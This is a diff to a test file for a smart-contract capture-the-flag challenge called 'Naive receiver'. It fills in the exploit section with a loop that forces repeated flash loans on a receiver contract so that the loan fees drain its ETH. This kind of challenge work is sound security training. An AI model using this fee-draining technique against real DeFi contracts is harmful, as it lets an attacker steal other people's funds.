@@ -31,7 +31,10 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** YOUR EXPLOIT GOES HERE */
+        // Keep taking flash loans until fees drain all the ETH.
+        for (let i = 9; i >= 0; i--) {
+            await this.pool.flashLoan(this.receiver.address, ether(String(i)));
+        }
     });
 
     after(async function () {
